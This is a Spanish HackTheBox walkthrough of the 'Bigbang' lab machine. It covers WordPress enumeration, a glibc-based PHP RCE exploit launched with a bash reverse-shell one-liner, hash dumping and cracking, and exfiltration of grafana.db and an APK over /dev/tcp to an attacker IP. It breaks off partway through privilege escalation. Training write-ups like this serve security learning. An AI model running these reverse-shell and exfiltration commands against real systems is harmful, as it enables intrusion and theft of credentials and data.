---
title: "HTB - Bigbang"
date: 2025-02-28T12:45:00-04:00
categories:
  - HackTheBox

tags:
  - pentesting
  - difícil
---

<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTB - Bigbang</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            margin: 20px;
            padding: 20px;
        }
        h1 {
            color: #4CAF50;
        }
        pre {
            background: #1e1e1e;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
        img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<h1>Acompáñame a explotar Bigbang</h1>

<!-- Espacio para la foto -->
<div style="text-align: center; margin: 20px;">
  <img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20022200.png?raw=true" 
       alt="Captura de pantalla" 
       style="max-width: 100%; height: auto; border-radius: 8px;" />
  <p>Bigbang</p>
</div>
<p>Comenzamos con el renococimiento de puertos Con nmap.</p>
<pre><code>
  sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.52 -oG Allports
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20130555.png?raw=true" alt="Captura de pantalla">
<p>Hacemos un analisis mas profundo en los puertos.</p>
<pre><code>
   sudo nmap -p22,8000,65535 -sCV -Pn 10.10.14.52
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-25%20225958.png?raw=true" alt="Captura de pantalla">
<p>Como podemos ver hay un sitio alojado en el puerto 80, Desde ya esta maquina es un dolor de cabeza no,nos permite acceder al sitio, para solucionarlo usaremos el siguiente comando.</p>
<pre><code>
   echo "10.10.11.52 blog.bigbang.htb" | sudo tee -a /etc/hosts
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20144525.png?raw=true" alt="Captura de pantalla">
<p>Una vez que estamos en el sitio podemos por el codigo fuente que el scripts es muy amplio, para hacer mas rapido la busqueda de directorios usaremos Gobuster:</p>
<pre><code>
    gobuster dir -u "http://blog.bigbang.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt                                 
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-25%20230650.png?raw=true" alt="Captura de pantalla">
<p>Tenemos varios dominios de Worpress, por lo tanto eh descargado wappalyzer, para ver que version esta alojada en el sitio.</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20150033.png?raw=true" alt="Captura de pantalla">
<p>interesante tenemos una version 6.5.4</p>
<p>vamos hacer un analisis mas aprofunidad,esperando encontrar vulneravilidades, antes de esto necesitamos tener una API_TOKEN .</p>
<pre><code>
https://wpscan.com       
export WPSCAN_API_TOKEN="TU KEY"
</code></pre>
<p>Ahora ejecutaremos la Herramienta WPSCAN.</p>
<pre><code>
 wpscan --url http://blog.bigbang.htb                    
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-26%20110857.png?raw=true" alt="Captura de pantalla">
<p>Encontramos varias vulneravilidades, necesitamos mas informacion, recordemos que tenemos un login, intentemos buscar usuaio.</p>
<pre><code>
wpscan --url http://blog.bigbang.htb -v -e u vp ap --random-user-agent dbe vt cb g4f9IlTtUUIxY4ZmJLBJSvK4vEzt5wVT18eON0fqPmw                 
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-26%20111548.png?raw=true" alt="Captura de pantalla">
<p>Encontramos 2 Usuario, intente descubrir su contraseña por medio de hydra pero fue insuficiente.</p>
<p>Estaba frustrado no sabia que hacer, pero me puse ah investigar un poco y me encontre con un archivo interesante.</p>
<pre><code>
  https://xz.aliyun.com/news/14127               
</code></pre>
<p>El artículo analiza una vulnerabilidad de desbordamiento de búfer en glibc, explotable en ciertos entornos PHP para ejecución remota de código. Aunque difícil de aprovechar, el autor explica cómo lo logró en aplicaciones PHP..</p>
<pre><code>
https://www.notion.so/signed/attachment%3Aace055bc-9a36-4fa0-ab84-3cb844b7b788%3Ainitial_exploit.py?table=block&id=18873e8e-2181-805d-b761-f7953d12f977&spaceId=23f8e6c4-d5a3-4565-b3fc-0b07a5534651&userId=8b7c069b-958a-4d18-9ff7-2f470772ff8e&cache=v2
https://www.notion.so/signed/attachment%3A7057fcef-35d2-4395-86f0-7d6a55db976a%3Alibc.so.6?table=block&id=18873e8e-2181-8058-a69f-f3b507dcaa14&spaceId=23f8e6c4-d5a3-4565-b3fc-0b07a5534651&userId=8b7c069b-958a-4d18-9ff7-2f470772ff8e&cache=v2
</code></pre>
<p>Ahora que ya entendimos un poco vamos a realizarlo.</p>
<pre><code>
   python3 rce.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"'         
</code></pre>
<p>vamos a encontrarnos con dos problemas.</p>
<p>Soluciones.</p>
<pre><code>
python3 -m venv myenv
source myenv/bin/activate
pip install ten
</code></pre>

<pre><code>
pw
python3 -m venv pwntools-env
source pwntools-env/bin/activate
pip install pwntools             
</code></pre>
<p>Ahora podemos correrlo.</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20160821.png?raw=true" alt="Captura de pantalla">
<p>Waooooooooooooooo, Accedimos.</p>

<pre><code>
hostname - I
  cd ..
 cat wp-config.php
     
</code></pre>
<p>Nos muestar informacion interesante.</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20161445.png?raw=true" alt="Captura de pantalla">
 <p>Debemos ejecutar el siguiente scripts para que nos genere las credenciales.</p>
<pre><code>
 echo "<?php
 \$host = '172.17.0.1';
 \$username = 'wp_user';
 \$password = 'wp_password';
 \$database = 'wordpress';
 \$mysqli = new mysqli(\$host, \$username, \$password, \$database);
 if (\$mysqli->connect_error) {
 die('Connection failed: ' . \$mysqli->connect_error);
 }
 \$query = 'SELECT * FROM wp_users';
 \$result = \$mysqli->query(\$query);
 if (\$result && \$result->num_rows > 0) {
 while (\$row = \$result->fetch_assoc()) {
 echo 'ID: ' . \$row['ID'] . \"\\n\";
 echo 'Username: ' . \$row['user_login'] . \"\\n\";
 echo 'Email: ' . \$row['user_email'] . \"\\n\";
 echo 'Display Name: ' . \$row['display_name'] . \"\\n\";
 echo 'Password Hash: ' . \$row['user_pass'] . \"\\n\";
 echo \"-----------------------------------\\n\";
 }
 } else {
 echo 'No users found or query failed.' . \"\\n\";
 }
 \$mysqli->close();
 ?>" > test2.php
para que corra el progama 
php test2.php
 </code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-27%20210343.png?raw=true" alt="Captura de pantalla">
<p>Usaremos john para descubrir el hash.</p>
<pre><code>
john --wordlist=/usr/share/wordlists/rockyou.txt shawking_hash        
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-27%20212335.png?raw=true" alt="Captura de pantalla">
<h1>USUARIO</h1>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20164834.png?raw=true" alt="Captura de pantalla">
<h1>Escalacion de privilegio</h1>
<p>Ahora vamos a enlistar los puertos abierto.</p>
<pre><code>
netstat -tulnp         
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20165835.png?raw=true" alt="Captura de pantalla">
<p>Reenvía el puerto 9090 y 3000, en el segundo tenemos grafana:.</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-27%20214259.png?raw=true" alt="Captura de pantalla">
<p>No es posible ingresar a la web con la informacion que tenemos</p>
<p>Encontre un archivo interesante en opt/data/grafana.db.</p>
<p>colocamos nuestra maquina en escucha,envairemos el arhivo alojado en la maquina victima a nuestra maquina .</p>
<pre><code>
  cat grafana.db > /dev/tcp/10.10.14.26/4444 
  nc -lvnp 4444 > grafana.db       
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20173009.png?raw=true" alt="Captura de pantalla">
<p>El archivo fue enviado con exito.</p>
<p>Es un archivo MSQL.</p>
<pre><code>
https://inloop.github.io/sqlite-viewer/             
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-27%20232844.png?raw=true" alt="Captura de pantalla">
<p>copiamos las cadenas de password y salt, creamos un archivo hash.txt procedemos a clonar la herramienta grafana2hashcat.</p>
<pre><code>
 https://github.com/iamaldi/grafana2hashcat        
</code></pre>
<p>Vamos a usarla</p>
<pre><code>
python3 grafana2hashcat.py hash.txt             
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20174036.png?raw=true" alt="Captura de pantalla">
<p>Ahora ejecutamos el codigo que nos recomienda</p>
<p>Advertencia</p>
<p>Antes de ejecutar este codigo cierra las aplicaciones que la tengas abierta inecesariamnete, ya que este codigo hace forzar un poco la cpu, tambien tener el almacenamiento necesario para usarlo.</p>
<pre><code>
sudo hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
             
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20004652.png?raw=true" alt="Captura de pantalla">
<pre><code>
bigbang
ssh developer@blog.bigbang.htb
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20180158.png?raw=true" alt="Captura de pantalla">
<p>Aquie tenemos algo parecido a lo que hicimos con el usurio anterior cd /android/ satellite-app.apk</p>
<pre><code>
cat  satellite-app.apk > /dev/tcp/10.10.14.26/4444
nc -lvnp 4444 > satellite-app.apk
</code></pre>
<p>Para abrir esta apk debemos tener apktool,jadx </p>
<pre><code>
sudo apt update
sudo apt install jadx
https://github.com/iBotPeaches/Apktool
</code></pre>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20012134.png?raw=true" alt="Captura de pantalla">
<p>Ahora que la herramienta nos ayudo a copilar los archivo podemos abrir nuestro archivos en jadx</p>
<pre><code>
sudo apt update
sudo apt install jadx
jadx-gui
</code></pre>
<p>¡Abre esa satellite-app.apk en esto y verifica que haya una parte interesante! Vemos que la aplicación está en el puerto 9090 Rastreando hacia atrás la función MainActivity, descubrimos un método Login que usa un oyente personalizado. Al examinar el agente de escucha, encontramos métodos que interactúan con un punto final enviando</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20190752.png?raw=true" alt="Captura de pantalla">
<p>algunas credenciales. El punto de conexión responde con un token web JSON , que probablemente se use para la autenticación</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20014916.png?raw=true" alt="Captura de pantalla">
<p>Podemos confirmar que está allí en el puerto Locahost 9090 para esa aplicación</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20015145.png?raw=true" alt="Captura de pantalla">
<p>Encontramos un punto final que proporciona un JWT y otro que acepta comandos. Nuestro objetivo es averiguar cómo enviar un comando a este segundo punto de conexión. A partir de la funcionalidad de inicio de sesión, ya entendemos cómo interactuar con el punto final de inicio de sesión. A medida que exploramos más a fondo el código fuente, nos encontramos con la función b bajo q0 , que parece relevante para nuestros próximos pasos</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20015512.png?raw=true" alt="Captura de pantalla">


<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>





























































</body>
</html>
